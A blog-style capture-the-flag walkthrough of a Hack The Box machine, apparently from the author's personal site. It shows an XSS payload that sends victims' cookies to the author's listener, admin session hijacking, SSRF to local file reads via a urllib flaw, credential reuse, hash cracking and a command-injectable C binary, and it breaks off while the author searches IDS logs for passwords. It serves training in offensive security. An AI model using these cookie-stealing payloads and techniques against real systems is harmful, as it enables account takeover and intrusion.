---
title: "Drive"
tags:
    - machine
    - xss
    - csrf
    - lfi
    - reversing
date: "2024-09-14"
thumbnail: "/assets/img/thumbnail/Intuition.png"
bookmark: true
---

# Description
---

<img src="/assets/img/thumbnail/Intuition.png" alt="Intuition">

# Solution
---
## Recon
---
Apply nmap scan
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/intuition]
└─$ nmap -sV -sC -Pn  10.10.11.15 

Nmap scan report for 10.10.11.15
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 28 17:24:09 2024 -- 1 IP address (1 host up) scanned in 14.61 seconds
```
Let's add `comprezzor.htb` to `/etc/hosts` file

When i try Web Directories brute forcing using `feroxbuster -u http://comprezzor.htb/`, I didn't get important information.


subdomain enumeration
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/intuition]
└─$ ffuf -u http://10.10.11.15 -H "Host: FUZZ.comprezzor.htb" -w ~/Desktop/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.15
 :: Wordlist         : FUZZ: /home/youssif/Desktop/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.comprezzor.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

auth                    [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 107ms]
report                  [Status: 200, Size: 3166, Words: 1102, Lines: 109, Duration: 119ms]
dashboard               [Status: 302, Size: 251, Words: 18, Lines: 6, Duration: 91ms]
```
There are 3 subdomains (dashboard,auth,report)

## shell as dev_acc
---
When you navigate within `comprezzor.htb`, You will find the function of the site is comperssion of text (txt), PDF (pdf), and Word (docx) files uploaded by you using the LZMA algorithm.

i searched for LZMA algorithm CVE, but i could't find.
Let's continue.

We have 3 subdomains:
- dashboard : accessable by admin only
When you visit it with no admin credentials you will get forwarded to `auth` subdomain
- auth : login and register page
when i create accounts i notice user data cookie in b64
user data cookie in plain
{"user_id": 6, "username": "youssif", "role": "user"}|3dd219ed9ef9ae06cd1fc02198c330abc769ee67294c918ff7a85dcd4710e1e4
{"user_id": 8, "username": "test", "role": "user"}|16265245f0ee972ac081d3ea812f4a36eb48feac79fd4e2d4d3b682c60fcf57b
I couldn't make use of the cookie in this state, but there's an important note:
The user_id us 6 and 8 etc..., this makes us wonder who has user_id = 1 (we all think it's admin and it's our goal)

after logging in also we found us got forwarded to `report` subdomain
- report : report bug functionality
And we have also option to see what happens when we report bug

    - Every reported bug is carefully reviewed by our skilled developers.
    - If a bug requires further attention, it will be escalated to our administrators for resolution.
    - We value your feedback and continuously work to improve our system based on your bug reports.


Reviewing every bug by skilled developer making us to think about `XSS`, we can try making the report to be xss malicious script to steal the cookie.

I set up listener on port 4444 and made the report title and desciption to be `<script>var i=new Image(); i.src="http://10.10.16.12:4444/?cookie="+btoa(document.cookie);</script>`

After submission i received this on the listener
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/intuition]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.11.15] 48508
GET /?cookie=dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA== HTTP/1.1
Host: 10.10.16.12:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dashboard.comprezzor.htb/
Connection: keep-alive
```

decode the cookie and you find that the field is `user_data` and the decoded value is `{"user_id": 2, "username": "adam", "role": "webdev"}|58f6f725339ce3f69d8552a10696ddebb68b2b57d2e523c08bde868d3a756db8`

very nice we got access to account with new role which is `webdev` with `user_id=2`.
Reaching this makes us wonder who is the user with id=1, but let's continue.

Let's go to the dashboard but this time we will use the new cookie we got and we will get the dashboard as `webdev` like this
<img src="/assets/img/htb/intuition/capture.png" alt="dashboard">
The report we submitted is here and have priority 0 and when we click on the ID we see this page
<img src="/assets/img/htb/intuition/capture1.png" alt="report">
We see we have mawny options but the most interesting is `Set High Priority` because if you remember in reporting bug there's steps one of them is `If a bug requires further attention, it will be escalated to our administrators for resolution.`, so we can increase the report's priority and the admin will review it and we can get the cookie of the admin like we did to get adam's cookie.

setup listener and click set high priority
and we received this on the listener
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/intuition]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.31] from (UNKNOWN) [10.10.11.15] 37298
GET /?cookie=dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNU3dnSW5WelpYSnVZVzFsSWpvZ0ltRmtiV2x1SWl3Z0luSnZiR1VpT2lBaVlXUnRhVzRpZlh3ek5EZ3lNak16TTJRME5EUmhaVEJsTkRBeU1tWTJZMk0yTnpsaFl6bGtNalprTVdReFpEWTRNbU0xT1dNMk1XTm1ZbVZoTWpsa056YzJaRFU0T1dRNQ== HTTP/1.1
Host: 10.10.16.31:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dashboard.comprezzor.htb/
Connection: keep-alive
```
after decoding the value of user_data is `{"user_id": 1, "username": "admin", "role": "admin"}|34822333d444ae0e4022f6cc679ac9d26d1d1d682c59c61cfbea29d776d589d9`
now we have access to admin account and when we visit the dashboard we find changes
<img src="/assets/img/htb/intuition/capture2.png" alt="admin">


Create PDF Report is the most interesting of them as it asks for url so it maybe vulnerable to SSRF.
I setup a listener and submitted this url
<img src="/assets/img/htb/intuition/capture3.png" alt="pdfGen">

I got this on the listener
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/intuition]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.31] from (UNKNOWN) [10.10.11.15] 34318
GET / HTTP/1.1
Accept-Encoding: identity
Host: 10.10.16.31:4444
User-Agent: Python-urllib/3.11
Cookie: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
Connection: close
```

after trials we will notice the user agent which is `Python-urllib/3.11` which is interesting.
after searching i found that it's vulnerable and the cve details and poc are <a href="https://vsociety.medium.com/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-ee438679351d">here</a>

It's very simple we put space before the url and this will result an LFI (we can include any local file) as example:
<img src="/assets/img/htb/intuition/capture4.png" alt="passwd">

After trials i didn't know how to reach effective file, but after searching i found `/proc/self/environ` which will give us how the program is invoked and the output was python3 /app/code/app.py`
so we knew the path of source code, let's read it using the LFI we have
<img src="/assets/img/htb/intuition/capture5.png" alt="app">
There's a secret key `7ASS7ADA8RF3FD7` and there's interesting imports that can tell us more paths about files we can reach
after examining them well we can conclude that the files are ordered in this way
```
/app
    /code
        app.py
        /blueprints
            /index
                __init__.py
                index.py
            /report
                __init__.py
                report.py
            /auth
                __init__.py
                auth.py
            /dashboard
                __init__.py
                dashboard.py
```
Let's read them
- index.py
<img src="/assets/img/htb/intuition/capture6.png" alt="index">
It contains info about the main function of the site (how it works), but this isn't interesting for us
- dashboard.py
<img src="/assets/img/htb/intuition/capture7.png" alt="dashboard">
Here ftp credentials which is very interesting
we can reach also `report.py` and `auth.py` but they weren't interesting

I tried to access the ftp from the cli using
```bash
┌──(youssif㉿youssif)-[~]
└─$ ftp ftp_admin@10.10.11.15
ftp: Can't connect to `10.10.11.15:21': Connection refused
ftp: Can't connect to `10.10.11.15:ftp'
```

These creds are for local ftp so we can access it through the pdf generator (exploiting SSRF to LFI as we did before), but the payload is `ftp://ftp_admin:u3jai8y71s2@ftp.local`
This will give us this
<img src="/assets/img/htb/intuition/capture8.png" alt="ftpFiles">
we can download the files using `ftp://ftp_admin:u3jai8y71s2@ftp.local/filename`
The private key is openSSH key
<img src="/assets/img/htb/intuition/capture9.png" alt="openSSH">
and Welcome_note file is this:
<img src="/assets/img/htb/intuition/capture10.png" alt="note">
This passphrase will help is to ssh into the target using the key we got before

I searched for ssh using openSSH key and found this <a href="https://stackoverflow.com/questions/54994641/openssh-private-key-to-rsa-private-key">article</a>
then, I put the key into file and started converting it into RSA key.
when i do this
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/intuition]
└─$ ssh-keygen -p -N "" -m pem -f key
Enter old passphrase: 
Key has comment 'dev_acc@local'
Your identification has been saved with the new passphrase.
```
the comment mentions the user so let's ssh into the machine using `ssh -i ./key dev_acc@10.10.11.15`
and GG we logged as `dev_acc` and we got the user flag
```bash
dev_acc@intuition:~$ cat user.txt
*******************************7
```


## shell as lopez
---
First let's know who are the users on the machine
```bash
dev_acc@intuition:/var/www/app$ cat /etc/passwd |grep 'sh'
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
adam:x:1002:1002:,,,:/home/adam:/bin/bash
dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash
lopez:x:1003:1003:,,,:/home/lopez:/bin/bash
```
Okey, we have dev_acc (our current session) and we have adam and lopez who can be our next targets and of course the root is our main goal.

As there was authentication in the site, so we are sure that there's a database and i think looking for the db files is the best thing to do once you get access on the target machine.

I went to the web directory `/var/www/app` and used this command
```bash
dev_acc@intuition:/var/www/app$ find . -name '*.db'
./blueprints/auth/users.db
./blueprints/report/reports.db
```
I tried to read `users.db` like this
```bash
dev_acc@intuition:/var/www/app$ strings ./blueprints/auth/users.db
SQLite format 3
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
Etableusersusers
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    role TEXT DEFAULT 'user'
indexsqlite_autoindex_users_1users
adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevh
adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin
adam
        admin
users
```
We are now sure it's `sqlite` database we can open the file with sqlite for more clear vision.
```bash
dev_acc@intuition:/var/www/app$ sqlite3 blueprints/auth/users.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606|admin
2|adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43|webdev
```

After searching <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">here</a>, I found that this is `Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)) *` hash.
Let's use hashcat to crack both hashes using `hashcat -m 30120 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -O`
I cracked it before, so to show them i will do this
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/intuition]
└─$ hashcat -m 30120 -a 0 hash.txt --show                             
sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray
```
I tried to SSH using these credentials, but i couldn't
```bash
dev_acc@intuition:/var/www/app$ su - adam
Password: 
su: Authentication failure
```

We can also try to login ftp as adam
```bash
dev_acc@intuition:/var/www/app$ ftp localhost
Connected to localhost.
220 pyftpdlib 1.5.7 ready.
Name (localhost:dev_acc): adam
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering extended passive mode (|||56079|).
150 File status okay. About to open data connection.
drwxr-xr-x   3 root     1002         4096 Apr 10 08:21 backup
226 Transfer complete.
```
as you see we logged in successfully and also we have backup directory, let's fetch its content and get it.
> note: in the target machine go to /tmp as example and connect to FTP again as you can't get file in any directory you need a directory you can write in.
```bash
ftp> cd backup
250 "/backup" is the current directory.
ftp> ls
229 Entering extended passive mode (|||54641|).
125 Data connection already open. Transfer starting.
drwxr-xr-x   2 root     1002         4096 Apr 10 08:21 runner1
226 Transfer complete.
ftp> cd runner1
250 "/backup/runner1" is the current directory.
ftp> ls
229 Entering extended passive mode (|||36709|).
125 Data connection already open. Transfer starting.
-rwxr-xr-x   1 root     1002          318 Apr 06 00:25 run-tests.sh
-rwxr-xr-x   1 root     1002        16744 Oct 19  2023 runner1
-rw-r--r--   1 root     1002         3815 Oct 19  2023 runner1.c
226 Transfer complete.
ftp> get run-tests.sh
local: run-tests.sh remote: run-tests.sh
229 Entering extended passive mode (|||34793|).
150 File status okay. About to open data connection.
100% |******************************************************|   318      759.28 KiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (499.27 KiB/s)
ftp> get runner1
local: runner1 remote: runner1
229 Entering extended passive mode (|||40317|).
150 File status okay. About to open data connection.
100% |******************************************************| 16744       18.58 MiB/s    00:00 ETA
226 Transfer complete.
16744 bytes received in 00:00 (12.93 MiB/s)
ftp> get runner1.c
local: runner1.c remote: runner1.c
229 Entering extended passive mode (|||51601|).
150 File status okay. About to open data connection.
100% |******************************************************|  3815        3.70 MiB/s    00:00 ETA
226 Transfer complete.
3815 bytes received in 00:00 (3.03 MiB/s)
```

Let's read the content of these files
- run-tests.sh

```bash
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
```

when i try to run any of these commands i get `Authentication failed`, let's look at the source code.
- runner.c

```c
// Version : 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/md5.h>

#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"

int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);

    char md5_str[33];
    for (int i = 0; i < 16; i++) {
        sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}

void listPlaybooks() {
    DIR *dir = opendir(PLAYBOOK_LOCATION);
    if (dir == NULL) {
        perror("Failed to open the playbook directory");
        return;
    }

    struct dirent *entry;
    int playbookNumber = 1;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
            printf("%d: %s\n", playbookNumber, entry->d_name);
            playbookNumber++;
        }
    }

    closedir(dir);
}

void runPlaybook(const char *playbookName) {
    char run_command[1024];
    snprintf(run_command, sizeof(run_command), "%s -i %s %s%s", ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
    system(run_command);
}

void installRole(const char *roleURL) {
    char install_command[1024];
    snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleURL);
    system(install_command);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    int auth_required = 0;
    char auth_key[128];

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0) {
            if (i + 1 < argc) {
                strncpy(auth_key, argv[i + 1], sizeof(auth_key));
                auth_required = 1;
                break;
            } else {
                printf("Error: -a option requires an auth key.\n");
                return 1;
            }
        }
    }

    if (!check_auth(auth_key)) {
        printf("Error: Authentication failed.\n");
        return 1;
    }

    if (strcmp(argv[1], "list") == 0) {
        listPlaybooks();
    } else if (strcmp(argv[1], "run") == 0) {
        int playbookNumber = atoi(argv[2]);
        if (playbookNumber > 0) {
            DIR *dir = opendir(PLAYBOOK_LOCATION);
            if (dir == NULL) {
                perror("Failed to open the playbook directory");
                return 1;
            }

            struct dirent *entry;
            int currentPlaybookNumber = 1;
            char *playbookName = NULL;

            while ((entry = readdir(dir)) != NULL) {
                if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
                    if (currentPlaybookNumber == playbookNumber) {
                        playbookName = entry->d_name;
                        break;
                    }
                    currentPlaybookNumber++;
                }
            }

            closedir(dir);

            if (playbookName != NULL) {
                runPlaybook(playbookName);
            } else {
                printf("Invalid playbook number.\n");
            }
        } else {
            printf("Invalid playbook number.\n");
        }
    } else if (strcmp(argv[1], "install") == 0) {
        installRole(argv[2]);
    } else {
        printf("Usage2: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    return 0;
}
```

After analyzing the code we will find important notes.
- we have the hash of the auth key `AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"` and It's the md5 of the authentication key.
- we already have part of the key from `run-tests.sh` which is `UHI75GHI****`, so we can use hashcat or even write a python script for getting the key.
```bash
┌──(youssif㉿youssif)-[~]
└─$ hashcat -m 0 -a 3 0feda17076d793c2ef2870d7427ad4ed  UHI75GHI?a?a?a?a -O
---snip---
0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP 
---snip---
```
We got the auth key `UHI75GHINKOP`.

After examining the code also we will find that there are 3 possible action: `list, run playbook_number, install role_url`
run and install are vulnerable to command injection due to the use of `system` without any input sanitization and install is more clear as the argument passed to it is the last argument in the executed command and we can abuse this to cmd injection.

but we can't do `sudo -l` as we don't have the password of the current user, so we can't run runner1 as root.
Let look further in the machine

I used `ss -tulpn` to see if there's service listening on local port and i found this
```bash
dev_acc@intuition:~$ ss -tulpn
Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port   Process    
udp      UNCONN    0         0            127.0.0.53%lo:53               0.0.0.0:*                 
udp      UNCONN    0         0                  0.0.0.0:68               0.0.0.0:*                 
udp      UNCONN    0         0                  0.0.0.0:53997            0.0.0.0:*                 
udp      UNCONN    0         0                  0.0.0.0:5353             0.0.0.0:*                 
udp      UNCONN    0         0                     [::]:49919               [::]:*                 
udp      UNCONN    0         0                     [::]:5353                [::]:*                 
tcp      LISTEN    0         4096             127.0.0.1:8080             0.0.0.0:*                 
tcp      LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*                 
tcp      LISTEN    0         100             172.21.0.1:21               0.0.0.0:*                 
tcp      LISTEN    0         4096             127.0.0.1:37671            0.0.0.0:*                 
tcp      LISTEN    0         511                0.0.0.0:80               0.0.0.0:*                 
tcp      LISTEN    0         128                0.0.0.0:22               0.0.0.0:*                 
tcp      LISTEN    0         4096             127.0.0.1:4444             0.0.0.0:*                 
tcp      LISTEN    0         100              127.0.0.1:21               0.0.0.0:*                 
tcp      LISTEN    0         128                   [::]:22                  [::]:*
```
to access service on local port, we will try port forwarding like this `ssh -L 9001:127.0.0.1:4444 -i ./key dev_acc@10.10.11.15`, so browsing in `localhost:9001` will forward us to port 4444 on the target.
I found `Selenium Grid` on port 4444, but after searching i found no interesting thing to do here.

Let's see the running processes using `ps -ef`.
I found interesting `suricata` process running.
Then i read the configurations of `suricata` in `/etc/suricata/suricata.yaml`, I found that logs are in `/var/log/suricata` so let's go there.
we want creds for adam or lopez for ssh, so we will search in these logs for that.
```bash
dev_acc@intuition:/var/log/suricata$ zgrep "lopez" *.gz
eve.json.8.gz:{"timestamp":"2023-09-28T17:43:36.099184+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:44:32.133372+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
```
I found two interesting events when i searched for lopez for these flows the username is send, we want to track these flows for the password.
```bash
dev_acc@intuition:/var/log/suricata$ zgrep "1988487100549589" *.gz
eve.json.8.gz:{"timestamp":"2023-09-28T17:43:36.098934+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"anomaly","src_ip":"192.168.227.13","src_port":21,"dest_ip":"192.168.227.229","dest_port":37522,"proto":"TCP","community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","anomaly":{"app_proto":"ftp","type":"applayer","event":"APPLAYER_DETECT_PROTOCOL_ONLY_ONE_DIRECTION","layer":"proto_detect"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:43:36.098934+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":0,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"completion_code":["220"],"reply":["pyftpdlib 1.5.7 ready."],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:43:36.099184+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:43:52.999165+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"PASS","command_data":"Lopezzz1992%123","completion_code":["530"],"reply":["Authentication failed."],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:43:58.799539+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":3,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"QUIT","completion_code":["221"],"reply":["Goodbye."],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:47:27.172398+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"alert","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","alert":{"action":"allowed","gid":1,"signature_id":2001,"rev":2001,"signature":"FTP Failed Login Attempt","category":"","severity":3},"app_proto":"ftp","app_proto_tc":"failed","flow":{"pkts_toserver":10,"pkts_toclient":10,"bytes_toserver":708,"bytes_toclient":771,"start":"2023-09-28T17:43:32.969173+0000"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:47:27.173121+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"flow","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","app_proto":"ftp","app_proto_tc":"failed","flow":{"pkts_toserver":10,"pkts_toclient":10,"bytes_toserver":708,"bytes_toclient":771,"start":"2023-09-28T17:43:32.969173+0000","end":"2023-09-28T17:43:58.799628+0000","age":26,"state":"closed","reason":"timeout","alerted":true},"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","tcp":{"tcp_flags":"1b","tcp_flags_ts":"1b","tcp_flags_tc":"1b","syn":true,"fin":true,"psh":true,"ack":true,"state":"closed"}}
```
```bash
dev_acc@intuition:/var/log/suricata$ zgrep "1218304978677234" *.gz
eve.json.8.gz:{"timestamp":"2023-09-28T17:44:32.130222+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":0,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"completion_code":["220"],"reply":["pyftpdlib 1.5.7 ready."],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:44:32.133372+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:44:48.188361+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"PASS","command_data":"Lopezz1992%123","completion_code":["230"],"reply":["Login successful."],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:44:48.188882+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":3,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"SYST","completion_code":["215"],"reply":["UNIX Type: L8"],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:44:48.189137+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":4,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"completion_code":["211"],"reply":["Features supported:"," EPRT"," EPSV"," MDTM"," MFMT"," MLST type*;perm*;size*;modify*;unique*;unix.mode;unix.uid;unix.gid;"," REST STREAM"," SIZE"," TVFS"," UTF8"],"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:44:50.305618+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":5,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"EPSV","completion_code":["229"],"reply":["Entering extended passive mode (|||35389|)."],"dynamic_port":35389,"reply_received":"yes"}}
eve.json.8.gz:{"timestamp":"2023-09-28T17:44:50.307049+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":6,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"LIST","completion_code":["125","226"],"reply":["Data connection already open. Transfer starting.","Transfer complete."],"reply_received":"yes"}}
